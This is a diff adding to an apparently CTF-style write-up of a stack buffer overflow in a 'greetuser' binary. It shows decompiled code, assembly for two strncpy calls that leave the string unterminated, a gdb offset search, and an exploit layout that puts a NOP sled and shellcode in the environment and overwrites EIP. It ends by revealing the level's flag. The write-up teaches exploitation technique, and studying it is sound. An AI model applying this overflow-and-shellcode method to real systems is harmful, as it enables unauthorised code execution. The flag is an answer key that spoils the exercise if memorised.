@@ -121,5 +121,118 @@ and the function
 
 let's deep dive inside the greetuser :
 
+int __cdecl greetuser(char a1)
+{
+  _DWORD v2[4]; // [esp+10h] [ebp-48h] BYREF
+  __int16 v3; // [esp+20h] [ebp-38h]
+  char v4; // [esp+22h] [ebp-36h]
 
-is make juste a test about
+  switch ( language )
+  {
+    case 1:
+      v2[0] = unk_8048717;
+      v2[1] = *((_DWORD *)&unk_8048717 + 1);
+      v2[2] = *((_DWORD *)&unk_8048717 + 2);
+      v2[3] = *((_DWORD *)&unk_8048717 + 3);
+      v3 = *((_WORD *)&unk_8048717 + 8);
+      v4 = *((_BYTE *)&unk_8048717 + 18);
+      break;
+    case 2:
+      strcpy((char *)v2, "Goedemiddag! ");
+      break;
+    case 0:
+      strcpy((char *)v2, "Hello ");
+      break;
+  }
+  strcat(v2, &a1);
+  return puts(v2);
+}
+
+
+so the exploitation is strncpy is copy n element but if the src element is
+the same size of the dest is not copy the null byte
+inside the documention :
+because the strncpy copy n here 20 caracter from the input is ok right ?
+yes but if you look little more close ins the man you watch this 
+
+
+CAVEATS
+       The name of these functions is confusing.  These functions produce a null-padded character sequence, not
+       a string (see string_copying(7)).  For example:
+
+           strncpy(buf, "1", 5);       // { '1',   0,   0,   0,   0 }
+           strncpy(buf, "1234", 5);    // { '1', '2', '3', '4',   0 }
+           strncpy(buf, "12345", 5);   // { '1', '2', '3', '4', '5' }
+           strncpy(buf, "123456", 5);  // { '1', '2', '3', '4', '5' }
+
+the exploitation is here ;
+  strncpy(dest, argv[1], 40u);
+  strncpy(&dest[40], argv[2], 32u);
+
+  look's deep dive inside :
+
+
+is move the first argument insude the src 
+mov     eax, [ebp+argv]
+add     eax, 4
+mov     eax, [eax]
+
+
+after is copy 40 octet from the src and copy to the buffer 
+the buffer is size 76 
+mov     dword ptr [esp+8], 40 ; 
+mov     [esp+4], eax
+lea     eax, [esp+80]
+mov     [esp], eax
+call    _strncpy
+
+
+after is get the second argument and copy inside the last buffer att addr 40
+
+mov     eax, [ebp+argv]
+add     eax, 8
+mov     eax, [eax]
+mov     dword ptr [esp+8], 32 ;
+mov     [esp+4], eax
+lea     eax, [esp+40]
+add     eax, 40 ;
+mov     [esp], eax
+call    _strncpy
+
+
+
+so if you put more than 40 octet inside the first arguement is juste not put the \0
+and after is concat two the last !
+
+
+now how much you need to overidh the eip addr :
+
+so is get from the stdin 40 + 32 = 72
+
+and concat with the lang string nl is 13 octet so is 72 + 13 = 85 OCTET !!
+
+i use gdb to find the offset to override the eip addr :
+
+(gdb) pattern search $eip
+[+] Searching for '61676161'/'61616761' with period=4
+[+] Found at offset 23 (little-endian search) likely
+
+
+
+so the PAYLOAD is like that :
+
+
+ENV LANG=nl  + "NOP" * 100 + shellcode
+
+arg1 = A * 40
+arg2 = A * (23 -4) + ADDR_SHELLCODE
+
+
+how to get the address of the payload 
+(gdb) x/s *environ
+0xbffff840:	 "LC_PAPER=de_CH.UTF-8"
+0xbffffee9:	 "LANG=en_US.UTF-8"
+
+
+and get the flag !
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
